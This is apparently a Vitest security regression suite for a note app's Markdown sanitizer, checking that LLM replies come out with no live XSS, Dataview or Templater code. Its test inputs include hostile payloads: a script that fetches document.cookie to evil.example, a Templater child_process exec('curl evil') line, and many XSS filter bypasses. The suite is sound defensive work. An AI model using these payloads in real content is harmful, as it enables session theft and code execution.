/**
 * B3 sanitizer hardening — security regressions (plan:
 * .claude/PRPs/plans/b3-sanitizer-hardening.plan.md). Every case here is a
 * confirmed bypass of the pre-hardening sanitizer, plus the invariants the fix
 * must hold: the sanitizer is TOTAL (never throws) and IDEMPOTENT
 * (s(s(x)) === s(x)), and it fails closed when its fixed point is not reached.
 */
import { afterEach, describe, expect, it, vi } from "vitest";

import {
  filterFrontmatterKeys,
  sanitizeAndNormalize,
  sanitizeMarkdown,
  sanitizeReplyBody,
  type NoteType,
} from "./enrichSanitize";
import { splitFrontmatter } from "./frontmatter";
import { executeChat } from "./llmHttp";

function ideaNote(body: string): string {
  return `---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea, seedling]\n---\n${body}`;
}

const s = sanitizeMarkdown;

// ── Item 1: inline Dataview spans are made inert, not deleted (decision 2) ────

describe("item 1 — inline Dataview spans made inert", () => {
  it("rewrites `= …` to the inert form, keeping the content visible", () => {
    const input = ideaNote("# Title\n\nToday: `= this.file.name` here.\n");
    expect(s(input)).toBe(ideaNote("# Title\n\nToday: `inert: = this.file.name` here.\n"));
  });

  it("covers the inline DataviewJS prefix `$=`", () => {
    const input = ideaNote("# T\n\n`$= dv.el('b', 'pwned')`\n");
    expect(s(input)).toBe(ideaNote("# T\n\n`inert: $= dv.el('b', 'pwned')`\n"));
  });

  it("covers a double-backtick span with a leading space (Dataview trims)", () => {
    expect(s("x `` =this.file.name `` y")).toBe("x ``inert:  =this.file.name `` y");
  });

  it("covers a single-backtick span with a leading space", () => {
    expect(s("a ` =x` b")).toBe("a `inert:  =x` b");
  });

  it("pairs spans instead of matching a regex — `x`=b is not a query", () => {
    const input = "a `x`=b `c` and `k` = `v`";
    expect(s(input)).toBe(input);
  });

  it("honors a backslash-escaped backtick before the real opener", () => {
    // `\`` is a literal backtick, so the NEXT run opens the live `= x` span.
    expect(s("\\` `= x`")).toBe("\\` `inert: = x`");
  });

  it("does not pair across a heading boundary", () => {
    expect(s("# Head `a\n`= x`\n")).toContain("`inert: = x`");
  });

  it("does not pair across a blank line", () => {
    expect(s("x `a\n\n`= evil`\n")).toContain("`inert: = evil`");
  });

  it("catches a span that crosses a soft line break", () => {
    expect(s("`= this\nfile.name`")).toBe("`inert: = this\nfile.name`");
  });

  it("catches a span in a table cell (GFM splits cells before spans)", () => {
    expect(s("| h | i |\n|---|---|\n| `a | `= x` |\n")).toContain("`inert: = x`");
  });

  it("review LOW-8: a pipe inside a span outside any table is not a cell split", () => {
    const prose = "Count lines: `ls | wc -l` = `n` files.\n";
    expect(s(prose)).toBe(prose);
  });

  it("review HIGH-2: a backtick inside a raw HTML attribute does not open a span", () => {
    expect(s('<b title="`">`= this.file.name`</b>')).toBe('<b title="`">`inert: = this.file.name`</b>');
  });

  it("review HIGH-2: a backtick inside an autolink does not open a span", () => {
    expect(s("<http://x.y/`>`= this.file.name`")).toBe("<http://x.y/`>`inert: = this.file.name`");
  });

  it("review HIGH-2: a span that starts first still wins over a later tag", () => {
    const prose = "`a <b title='` then `k` = 1";
    expect(s(prose)).toBe(prose);
  });

  it("escapes a raw HTML <code> element (Dataview reads every <code>)", () => {
    const out = s("# T\n\n<code>$= dv.el('b', 'x')</code> and <CODE>= 1</CODE>\n");
    expect(out).not.toMatch(/<code/i);
    expect(out).toContain("&lt;code>$= dv.el('b', 'x')");
  });

  it("leaves a span inside a certain ```js fence byte-for-byte untouched", () => {
    const input = "```js\nconst s = `=${a}`;\n```\n";
    expect(s(input)).toBe(input);
  });
});

// ── Review MEDIUM-7 (human decision 2026-09-30): code blocks run as queries ──
// Dataview's default `inlineQueriesInCodeblocks: true` evaluates a whole code
// block whose text, trimmed, starts with `=` / `$=`. Such a block gets the
// inert marker on its FIRST content line only; every other block is untouched.

describe("review MEDIUM-7 — code blocks that would run as queries", () => {
  const cases: Array<[string, string, string]> = [
    ["backtick fence", "```js\n= this.file.name\n```\n", "```js\ninert: = this.file.name\n```\n"],
    ["leading blank line, `$=`", "```text\n\n  $= dv.el('b','x')\nmore\n```", "```text\n\n  inert: $= dv.el('b','x')\nmore\n```"],
    ["renamed dataviewjs", "```dataviewjs\n= x\n```", "```text\ninert: = x\n```"],
    ["tilde fence", "~~~\n= x\n~~~", "~~~\ninert: = x\n~~~"],
    ["list-item fence", "- ```js\n  = x\n  ```", "- ```js\n  inert: = x\n  ```"],
    ["callout fence", "> ```\n> = x\n> ```", "> ```\n> inert: = x\n> ```"],
    ["indented code block", "para\n\n    = this.file.name\n", "para\n\n    inert: = this.file.name\n"],
    ["indented code block after a heading", "# H\n    = x\n", "# H\n    inert: = x\n"],
    ["indented code block after a rule", "a\n\n***\n    $= x\n", "a\n\n***\n    inert: $= x\n"],
  ];
  for (const [name, input, expected] of cases) {
    it(`makes a ${name} inert on its first content line`, () => {
      expect(s(input)).toBe(expected);
      expect(s(expected)).toBe(expected);
    });
  }

  it("leaves every other code block byte-identical", () => {
    for (const block of [
      "```js\nconst a = 1;\n= later line\n```\n",
      "```js\nconst s = `=${a}`;\n```\n",
      "para\n    = lazy continuation, not code\n",
      "```\n```\n= prose after an empty fence\n",
    ]) {
      expect(s(block), JSON.stringify(block)).toBe(block);
    }
  });
});

// ── Item 3: a fence line in the frontmatter must not hide the body ────────────

describe("item 3 — frontmatter-aware fence scan", () => {
  it("drops a fence line from the header and scans the body from a clean state", () => {
    const input =
      "---\ncreated: 2026-07-04\n```\nstatus: seedling\ntags: [idea]\n---\n# T\n\n```dataviewjs\ndv.pages()\n```\n\n<script>x</script>\n";
    const out = s(input);
    expect(out).toBe(
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\n---\n# T\n\n```text\ndv.pages()\n```\n\n[script removed]\n",
    );
    expect(sanitizeAndNormalize(input, "idea")).toBe(out);
  });

  it("rewrites a loose `----` closer to exactly `---`", () => {
    const input = "---\ncreated: 2026-07-04\n```\n----\n# T\n\n<script>x</script>\n";
    expect(s(input)).toBe("---\ncreated: 2026-07-04\n---\n# T\n\n[script removed]\n");
  });

  it("normalizes CRLF so a ```dataviewjs\\r opener is renamed", () => {
    const input =
      "---\r\ncreated: 2026-07-04\r\nstatus: seedling\r\ntags: [idea]\r\n---\r\n# T\r\n\r\n```dataviewjs\r\ndv.pages()\r\n```\r\n";
    expect(s(input)).toBe(
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\n---\n# T\n\n```text\ndv.pages()\n```\n",
    );
  });

  it("normalizes lone-CR line endings", () => {
    expect(s("# T\r\r```dataviewjs\rdv.pages()\r```\r")).toBe("# T\n\n```text\ndv.pages()\n```\n");
  });
});

// ── Item 4: one pass must not assemble a live construct ───────────────────────

describe("item 4 — fixed point", () => {
  const rows: Array<[string, string, RegExp]> = [
    ["on*= removal joins <sc…ript>", `<sc onx="y"ript>alert(1)</script>`, /<script/i],
    ["on*= removal joins live Templater", `< onx="1"%* tR += "x" %>`, /<%/],
    ["on*= removal joins <svg/onload>", `<svg/on onx="1"load=alert(1)>`, /onload/i],
    ["on*= removal assembles a dataviewjs fence", '`` onx="1"`dataviewjs\ndv.pages()\n```', /```dataviewjs/],
  ];

  for (const [name, input, live] of rows) {
    it(`${name}: no live construct after sanitizing`, () => {
      const out = s(input);
      expect(out).not.toMatch(live);
      expect(s(out)).toBe(out);
    });
  }

  /** Each pass strips one `on*=` layer and exposes the next one. */
  function nested(depth: number): string {
    return `<img src=x${" o".repeat(depth)} onq='z'${"nx='z'".repeat(depth)}nx=alert(1)>`;
  }

  it("converges for shallow nesting without failing closed", () => {
    const out = s(`# T\n\n${nested(2)}\n`);
    expect(out).not.toMatch(/on[a-z]+\s*=/i);
    expect(out).toContain("<img src=x");
    expect(s(out)).toBe(out);
  });

  it("fails CLOSED when the pass cap is hit — never returns the last iteration", () => {
    const out = s(`# T\n\n${nested(12)}\n`);
    expect(out).not.toContain("<");
    expect(out).toContain("&lt;img src=x");
    expect(out).not.toMatch(/on[a-z]+\s*=/i);
    expect(s(out)).toBe(out);
  });
});

// ── Extras (decision 3) ───────────────────────────────────────────────────────

describe("extras — fences in containers, fake openers, quote-delimited on*=", () => {
  it("renames executable fences after a list marker or a callout `>`", () => {
    const input = "- ```dataviewjs\n  dv.x()\n  ```\n\n> ```dataview\n> LIST\n> ```\n\n> - 1. ~~~DataviewJS\n";
    expect(s(input)).toBe(
      "- ```text\n  dv.x()\n  ```\n\n> ```text\n> LIST\n> ```\n\n> - 1. ~~~text\n",
    );
  });

  it("a 4-space-indented ``` is not a fence opener (it hid what followed)", () => {
    expect(s("# T\n\n    ```\n<script>alert(1)</script>\n")).not.toContain("<script");
  });

  it("a backtick fence with a backtick in its info string is not an opener", () => {
    expect(s("# T\n\n```a`b\n<script>alert(1)</script>\n")).not.toContain("<script");
  });

  it("a fence in a list item closes when the item does (dedented line)", () => {
    expect(s("- a\n  ```js\n<script>x</script>\n  ```\n")).not.toContain("<script");
  });

  it("review HIGH-3a: a list item's fence closes at a closer valid relative to the item", () => {
    const out = s("- a\n  ```js\n     ```\n\n  `= this.file.name`\n\n  <img src=x onerror=alert(1)>\n");
    expect(out).toContain("`inert: = this.file.name`");
    expect(out).not.toMatch(/onerror/i);
  });

  it("review HIGH-3b: an item's closer is not read as a new certain opener", () => {
    expect(s("- ```js\n  x\n  ```\n  <img src=x onerror=alert(1)>\n")).not.toMatch(/onerror/i);
    expect(s("1. ~~~\n   ~~~\n   <iframe src=x></iframe>\n")).not.toMatch(/<iframe/i);
    const out = s(
      "- ```js\n  ```\n  [x](javascript:alert(1)) `= this.file.name` <img src=x onerror=alert(1)> <script>alert(2)</script>",
    );
    expect(out).not.toMatch(/javascript:|onerror|<script/i);
    expect(out).toContain("`inert: = this.file.name`");
  });

  it("review HIGH-3: relative closers in ordered-list and nested fences (probe1)", () => {
    expect(s("1. a\n   ```js\n      ```\n   <img src=x onerror=alert(1)>\n")).not.toMatch(/onerror/i);
    const out = s("- a\n  ```js\n  x\n     ```\n  <img src=x onerror=alert(1)>\n  <script>alert(1)</script>\n");
    expect(out).not.toMatch(/onerror|<script/i);
    expect(s("- a\n  ```js\n     ```\n  ~~~js\n  ok\n  ~~~\n  [x](javascript:alert(1))\n")).not.toContain("javascript:");
  });

  it("a top-level fence whose closer a lenient renderer would accept early", () => {
    // Strict CommonMark keeps `    ```` as content; a lenient one closes there.
    expect(s("```js\n    ```\n<script>alert(1)</script>\n```\n")).not.toContain("<script");
  });

  it("a fence line inside an HTML block is HTML, not a fence opener", () => {
    expect(s("<div>\n```js\n<img src=x onerror=alert(1)>\n```\n")).not.toMatch(/onerror/i);
  });

  it("defuses an on*= attribute glued to a closing quote — src=\"x\"onerror=", () => {
    // Encoded, not deleted: `onerror&#61;"…"` is one inert attribute NAME.
    expect(s(`# T\n\n<img src="x"onerror="alert(1)">\n`)).toBe(`# T\n\n<img src="x"onerror&#61;"alert(1)">\n`);
  });

  it("review MEDIUM-5: the quote-adjacent on*= form never deletes prose", () => {
    expect(s("Turn it on = off? 'online=true' and \"x\"onward = 3\n")).toBe(
      "Turn it on = off? 'online&#61;true' and \"x\"onward &#61; 3\n",
    );
  });
});

// ── Review round: body-only replies (Enhance, Ask) never split frontmatter ────

describe("review HIGH-1 — body-only replies", () => {
  it("neutralizes a leading `---` block instead of treating it as a header", () => {
    const reply = "---\n`= this.file.name\n`\n<img src=x\nonerror=alert(1)>\n---\nprose here";
    expect(sanitizeReplyBody(reply)).toBe(
      "***\n`inert: = this.file.name\n`\n<img src=x>\n---\nprose here",
    );
  });

  it("keeps fence lines inside a leading `---` block", () => {
    const reply = "---\nIntro\n```js\nx()\n```\n---\nMore\n";
    expect(sanitizeReplyBody(reply)).toBe("***\nIntro\n```js\nx()\n```\n---\nMore\n");
  });

  it("can never become live frontmatter at file start (header-less Enhance)", () => {
    for (const reply of [
      "---\ndg-publish: true\ncssclasses: x\n---\nRewritten prose.",
      "\n\n---\ndg-publish: true\n---\nx",
      "---dg-publish: true\n---\nx",
    ]) {
      const out = sanitizeReplyBody(reply);
      expect(splitFrontmatter(out.trim()).header, JSON.stringify(reply)).toBe("");
      expect(sanitizeReplyBody(out)).toBe(out);
    }
    expect(sanitizeReplyBody("---\ndg-publish: true\n---\nRewritten prose.")).toBe(
      "***\ndg-publish: true\n---\nRewritten prose.",
    );
    expect(sanitizeReplyBody("---dg: x\n---\nbody")).toBe("\\---dg: x\n---\nbody");
  });

  it("leaves an ordinary body reply byte-identical", () => {
    const reply = "Went out early.\n\n- saw the heron\n\n---\n\nLater: `code` here.\n";
    expect(sanitizeReplyBody(reply)).toBe(reply);
  });
});

// ── Review MEDIUM-6: link-scheme forms that passed ───────────────────────────

describe("review MEDIUM-6 — link destinations", () => {
  const cases: Array<[string, string, string]> = [
    ["angle-bracket destination", "[x](<javascript:alert(1)>)", "[x](<#alert(1)>)"],
    ["decimal entity in the scheme", "[x](jav&#97;script:alert(1))", "[x](#alert(1))"],
    ["hex entity and &colon;", "[x](&#x6A;avascript&colon;alert(1))", "[x](#alert(1))"],
    ["tab entity inside the scheme", "[x](<java&Tab;script:alert(1)>)", "[x](<#alert(1)>)"],
    ["reference definition", "[x]: javascript:alert(1)\n\n[click][x]", "[x]: #alert(1)\n\n[click][x]"],
    ["angle reference definition", "[x]: <javascript:alert(1)>\n", "[x]: <#alert(1)>\n"],
    ["angle data: destination", "[x](<data:text/html,<b>hi</b>>)", "[x](<#text/html,<b>hi</b>>)"],
    ["reference data: definition", "[x]: data:text/html,hi\n", "[x]: #text/html,hi\n"],
    ["javascript: autolink", "see <javascript:alert(1)> now", "see <#alert(1)> now"],
    ["entity-encoded raw href", '<a href="jav&#x61;script:alert(1)">x</a>', '<a href="#alert(1)">x</a>'],
    ["backslash-escaped colon", "[x](javascript\\:alert(1))", "[x](#alert(1))"],
    ["backslash-escaped reference definition", "[x]: javascript\\:alert(1)\n", "[x]: #alert(1)\n"],
    ["space padding past any window", `<a href="${" ".repeat(200)}javascript:alert(1)">x</a>`, '<a href="#alert(1)">x</a>'],
    ["tab-entity padding past any window", `<a href="java${"&Tab;".repeat(130)}script:alert(1)">x</a>`, '<a href="#alert(1)">x</a>'],
    ["zero-padded numeric reference", '<a href="&#0000000106;avascript:alert(1)">x</a>', '<a href="#alert(1)">x</a>'],
    ["zero-padded reference in a destination", "[x](&#x000006A;avascript:alert(1))", "[x](#alert(1))"],
    ["space-padded angle destination", "[x](<   javascript:alert(1)>)", "[x](<#alert(1)>)"],
    // Security re-review 2026-09-30: definitions behind a container, or with
    // a label the column-0 rule could not read, and non-href URL attributes.
    ["blockquoted reference definition", "> [x]: javascript:alert(1)\n", "> [x]: #alert(1)\n"],
    ["list-item reference definition", "- [x]: javascript:alert(1)\n", "- [x]: #alert(1)\n"],
    ["reference definition with an escaped ]", "[a\\]b]: javascript:alert(1)\n", "[a\\]b]: #alert(1)\n"],
    ["reference definition with a multi-line label", "[a\nb]: javascript:alert(1)\n", "[a\nb]: #alert(1)\n"],
    ["form action", '<form action="javascript:alert(1)">', '<form action="#alert(1)">'],
    ["button formaction", '<button formaction="javascript:alert(1)">x</button>', '<button formaction="#alert(1)">x</button>'],
    ["data: link behind an escaped !", "\\![x](data:image/svg+xml;base64,PHN2Zz4=)", "\\![x](#svg+xml;base64,PHN2Zz4=)"],
  ];
  for (const [name, input, expected] of cases) {
    it(`neutralizes a ${name}`, () => {
      expect(s(input)).toBe(expected);
    });
  }

  it("accepts the ]:-anywhere over-match: only the dangerous scheme in prose becomes #", () => {
    // Matching a definition's `]:` anywhere also catches prose that literally
    // names a scheme after `]:`. Nothing else is touched — an accepted trade
    // for catching definitions behind containers and multi-line labels.
    expect(s("see [MDN]: javascript: basics\n")).toBe("see [MDN]: # basics\n");
    expect(s("see [MDN]: https://developer.mozilla.org\n")).toBe("see [MDN]: https://developer.mozilla.org\n");
  });

  it("keeps ordinary links and inline data: images byte-identical", () => {
    for (const ok of [
      "[a](https://x.y/javascript:foo) and [b](#javascript) and <https://x.y>",
      "![image](data:image/png;base64,iVBORw0KGgo=) and ![a [nested] alt](data:image/gif;base64,R0lG)",
      "[ref]: https://example.com\n",
      "> [ref]: https://example.com and see [a]: the note\n",
      // An escaped backslash leaves the `!` live: still a genuine image.
      "\\\\![image](data:image/png;base64,iVBORw0KGgo=)",
    ]) {
      expect(s(ok), ok).toBe(ok);
    }
  });
});

// ── Item 2: model-emitted frontmatter keys are allowlisted on BOTH branches ───

describe("item 2 — strict frontmatter allowlist on executeChat's two branches", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  async function chat(content: string, noteType: NoteType | null = "idea"): Promise<string> {
    const body = JSON.stringify({ model: "m", choices: [{ message: { role: "assistant", content } }] });
    vi.stubGlobal("fetch", vi.fn().mockResolvedValue(new Response(body, { status: 200 })));
    const { markdown } = await executeChat(
      "https://llm.example.com",
      "k",
      "m",
      [{ role: "user", content: "x" }],
      noteType,
      "Test",
    );
    return markdown;
  }

  it("compliant branch drops extra keys (dg-publish, publish, cssclasses)", async () => {
    const md = await chat(
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\ndg-publish: true\npublish: true\ncssclasses: [x]\n---\n# T\n",
    );
    expect(md).toBe("---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\n---\n# T\n");
  });

  it("fallback branch (missing required `status`) drops extra keys too", async () => {
    const md = await chat("---\ncreated: 2026-07-04\ntags: [idea]\ndg-publish: true\n---\n# T\n");
    expect(md).toBe("---\ncreated: 2026-07-04\ntags: [idea]\n---\n# T\n");
  });

  it("fallback branch denies quoted, explicit and spaced key forms", async () => {
    const md = await chat(
      '---\ncreated: 2026-07-04\ntags:\n  - idea\n"dg-publish": true\n? publish\n: true\ndg publish: true\ncssclasses : [x]\n---\n# T\n',
    );
    expect(md).toBe("---\ncreated: 2026-07-04\ntags:\n  - idea\n---\n# T\n");
  });

  it("a body-only reply (noteType null) is sanitized but never key-filtered", async () => {
    // Enhance / Ask: a leading `---` block is prose below an app-owned header.
    const prose = "---\nIntro paragraph\n\nSummary: the gist\n---\nMore <script>x</script>\n";
    expect(await chat(prose, null)).toBe(
      "***\nIntro paragraph\n\nSummary: the gist\n---\nMore [script removed]\n",
    );
  });

  it("sanitizeMarkdown alone keeps app-written stub keys (source/mime/size)", () => {
    const stub =
      '---\ncreated: 2026-09-30\nkind: shared-audio\nsource: "memo.m4a"\nmime: "audio/mp4"\nsize: 12\ntags: [shared, audio]\n---\n# Shared audio\n';
    expect(s(stub)).toBe(stub);
  });
});

describe("filterFrontmatterKeys — deny by default at column 0", () => {
  it("keeps a canonical note byte-for-byte", () => {
    const md = "---\ndate: 2026-07-04\ntags: [journal]\npeople: []\nideas: []\n---\n# Day\n";
    expect(filterFrontmatterKeys(md, "journal")).toBe(md);
  });

  it("drops a non-canonical key together with the lines under it", () => {
    const md = "---\nname: Ada\ncssclasses:\n  - wide\n- loose\ntags:\n- person\n---\n# Ada\n";
    expect(filterFrontmatterKeys(md, "person")).toBe("---\nname: Ada\ntags:\n- person\n---\n# Ada\n");
  });

  it("drops comment, flow and orphan lines before the first key", () => {
    const md = "---\n  - orphan\n# comment\n{publish: true}\nkind: shared-link\n---\n# T\n";
    expect(filterFrontmatterKeys(md, "shared")).toBe("---\nkind: shared-link\n---\n# T\n");
  });

  it("leaves a note without frontmatter untouched", () => {
    expect(filterFrontmatterKeys("# T\n\ndg-publish: true\n", "idea")).toBe("# T\n\ndg-publish: true\n");
  });
});

// ── Review MEDIUM-4: bounded input, linear time ──────────────────────────────

describe("review MEDIUM-4 — availability", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  async function chatSized(chars: number): Promise<string> {
    const content = `# T\n\n${"x".repeat(chars - 5)}`;
    const body = JSON.stringify({ model: "m", choices: [{ message: { role: "assistant", content } }] });
    vi.stubGlobal("fetch", vi.fn().mockResolvedValue(new Response(body, { status: 200 })));
    const { markdown } = await executeChat("https://llm.example.com", "k", "m", [], "idea", "Test");
    return markdown;
  }

  it("rejects a reply over the 256 KiB cap as malformed — never truncates", async () => {
    await expect(chatSized(256 * 1024 + 1)).rejects.toThrow(/oversized response/);
    expect((await chatSized(256 * 1024)).length).toBe(256 * 1024);
  });

  // Each input is the largest the cap lets through; every one was quadratic
  // (seconds) before. The bound is ~40x the linear time, to stay CI-stable.
  const CAP = 256 * 1024;
  let distinctRuns = "";
  for (let k = 1; distinctRuns.length < CAP; k++) distinctRuns += `${"`".repeat(k)} x `;
  const adversarial: Array<[string, string]> = [
    ["unclosed Templater", "<%".repeat(CAP / 2)],
    ["lone <script openers", "<script ".repeat(CAP / 8)],
    ["lone <iframe openers", "<iframe ".repeat(CAP / 8)],
    ["unclosed link text", "[".repeat(CAP)],
    ["distinct-length backtick runs", distinctRuns.slice(0, CAP)],
  ];
  for (const [name, input] of adversarial) {
    it(`sanitizes ${name} at the cap in linear time`, () => {
      const started = performance.now();
      s(input);
      expect(performance.now() - started).toBeLessThan(2000);
    });
  }
});

// ── Review round: every reviewer probe as a named regression case ─────────────

const DEEP = `<img src=a${" o".repeat(10)} onq='z'${"nx='z'".repeat(10)}>`;

/** Inputs from the reviewers' probes (b3probe.ts, b3fuzz.ts, rv/probe1-4). */
const REVIEW_REPROS: Record<string, string> = {
  fmFence: "---\ncreated: x\n```\n---\n<script>a</script>\n```dataviewjs\ndv.x\n```\n",
  crFrontmatter: "----\rcreated: x\r```\r----\r<script>a</script>\r",
  crlfFence: "```dataviewjs\r\ndv.x\r\n```\r\n",
  indentedFake: "    ```\n<img src=x onerror=alert(1)>\n    ```",
  backtickInfoFake: "```a`b\n<img src=x onerror=alert(1)>\n```",
  srcNoSpace: `<img src="x"onerror=alert(1)>`,
  listClose: "- ```js\n  ```\n  [x](javascript:alert(1)) `= this.file.name` <img src=x onerror=alert(1)>",
  listCloseTilde: "1. ~~~\n   ~~~\n   `= this.file.name` <iframe src=x></iframe>",
  htmlAttrTick: '<b title="`">`= this.file.name`</b>',
  autolinkTick: "<http://x.y/`>`= this.file.name`",
  deepCap: `${DEEP} \`= this.file.name\` [a](javascript:b) <script>c</script>`,
  relCloserSpans: "- a\n  ```js\n     ```\n\n  Today: `= this.file.name` and `$= dv.el('b','x')`\n\n  <img src=x onerror=alert(1)>\n",
  bodyOnlyBlock: "---\n`= this.file.name\n`\n<img src=x\nonerror=alert(1)>\n---\nprose here",
};

describe("review repros — named regression cases", () => {
  const exact: Array<[string, string]> = [
    ["fmFence", "---\ncreated: x\n---\n[script removed]\n```text\ndv.x\n```\n"],
    ["crFrontmatter", "---\ncreated: x\n---\n[script removed]\n"],
    ["crlfFence", "```text\ndv.x\n```\n"],
    ["indentedFake", "    ```\n<img src=x>\n    ```"],
    ["backtickInfoFake", "```a`b\n<img src=x>\n```"],
    ["srcNoSpace", `<img src="x"onerror&#61;alert(1)>`],
    ["htmlAttrTick", '<b title="`">`inert: = this.file.name`</b>'],
    ["autolinkTick", "<http://x.y/`>`inert: = this.file.name`"],
  ];
  for (const [name, expected] of exact) {
    it(`${name} → exact neutralized form`, () => {
      expect(s(REVIEW_REPROS[name])).toBe(expected);
    });
  }

  it("listClose / listCloseTilde / relCloserSpans leave nothing live", () => {
    for (const name of ["listClose", "listCloseTilde", "relCloserSpans"]) {
      const out = s(REVIEW_REPROS[name]);
      expect(out, name).not.toMatch(/javascript:|onerror|<iframe|`=|`\$=/i);
    }
  });

  it("deepCap fails closed with every payload inert", () => {
    const out = s(REVIEW_REPROS.deepCap);
    expect(out).not.toContain("<");
    expect(out).not.toContain("`");
    expect(out).toContain("[a](#b)");
    expect(s(out)).toBe(out);
  });

  it("probe3: a gated note with a list-item fence ships nothing live", () => {
    const v =
      "---\ncreated: 2026-01-01\nstatus: seedling\ntags: [idea]\n---\n# T\n\n- ```js\n  x\n  ```\n  <img src=x onerror=alert(1)>\n\n  See `= this.file.name` and [a](javascript:alert(1))\n";
    const gated = filterFrontmatterKeys(sanitizeAndNormalize(v, "idea") ?? s(v), "idea");
    expect(gated).not.toMatch(/onerror|javascript:/i);
    expect(gated).toContain("`inert: = this.file.name`");
  });

  it("legitimate content from the reviewers' probe stays byte-identical", () => {
    for (const ok of [
      "Count lines: `ls | wc -l` = `n` files.\n",
      "| op | meaning |\n|---|---|\n| `a == b` | eq |\n| `x ||= y` | or-assign |\n",
      "> [!note] Title\n> Use `x = 1` here.\n> ```js\n> const a = `b`;\n> ```\n",
      "$$\n\\frac{a}{b} = c\n$$\nInline $x = 1$.\n",
      "```js\nel.onclick = () => go('<script>');\n```\n",
      "- step\n  ```bash\n  echo \"<b>hi</b>\" | tee x\n  ```\n- next\n",
      '---\ncreated: 2026-01-01\ntitle: "~~~ wow"\n---\nbody\n',
    ]) {
      expect(s(ok), ok).toBe(ok);
    }
  });
});

// ── Invariants: total + idempotent over the corpus and a seeded fuzz ──────────

const CORPUS: string[] = [
  ideaNote("# Title\n\n```dataviewjs\ndv.pages().file.tasks\n```\n"),
  ideaNote("# Title\n\n```dataview\nLIST FROM #idea\n```\n"),
  ideaNote("# Title\n\nToday: `= this.file.name` here.\n"),
  ideaNote("# Title\n\n```dataviewjs\n<%* const {exec}=require('child_process'); exec('curl evil') %>\n```\n"),
  ideaNote("# Title\n\n```js\nconst x = 1; // <%= tp.file.title %>\n```\n"),
  ideaNote("# Title\n\nDate: <%= tp.date.now() %>\n"),
  ideaNote("# Title\n\n<script>fetch('https://evil.example/'+document.cookie)</script>\n"),
  ideaNote(`# Title\n\n<img src="x" onerror="alert(1)">\n`),
  ideaNote("# Title\n\n<svg/onload=alert(1)>\n"),
  ideaNote("# Title\n\n<img/onerror=x src=y>\n"),
  ideaNote("# Title\n\n[click](javascript:alert(1))\n"),
  ideaNote("# Title\n\n[dl](data:text/html;base64,PHNjcmlwdD4=)\n"),
  ideaNote("# Title\n\n![text](data:text/html;base64,PHNjcmlwdD4=)\n"),
  "# Note\n\n## Actions\n- [ ] email Sam about the venue\n- [x] book the flight",
  "```js\nconst el = document.querySelector('#app');\nel.innerHTML = '<script>noop</script>';\n```",
  "```html\n<script>alert('doc')</script>\n<a href=\"javascript:void(0)\">x</a>\n```",
  "# Summary\n\nlocation: 48.8566,2.3522\n\n---\n\n## 14:00\n- did another thing",
  "---\ndate: 2026-07-04\ntags: [journal, work]\npeople: [[[Ada]]]\nideas: []\n---\n# Busy day\n",
  `<sc onx="y"ript>alert(1)</script>`,
  `< onx="1"%* tR += "x" %>`,
  `<svg/on onx="1"load=alert(1)>`,
  '`` onx="1"`dataviewjs\ndv.pages()\n```',
  "---\ncreated: 2026-07-04\n```\n----\n# T\n\n<script>x</script>\n",
  "# T\r\r```dataviewjs\rdv.pages()\r```\r",
  "a `x`=b `c` and `` =y `` \\` `= z`",
  `<img src=x${" o".repeat(12)} onq='z'${"nx='z'".repeat(12)}nx=alert(1)>`,
  ...Object.values(REVIEW_REPROS),
];

describe("invariants — idempotent over the corpus, both modes", () => {
  it("s(s(x)) === s(x) over the sanitizer corpus", () => {
    for (const input of CORPUS) {
      for (const sanitize of [s, sanitizeReplyBody]) {
        const once = sanitize(input);
        expect(sanitize(once), JSON.stringify(input)).toBe(once);
      }
    }
  });
});
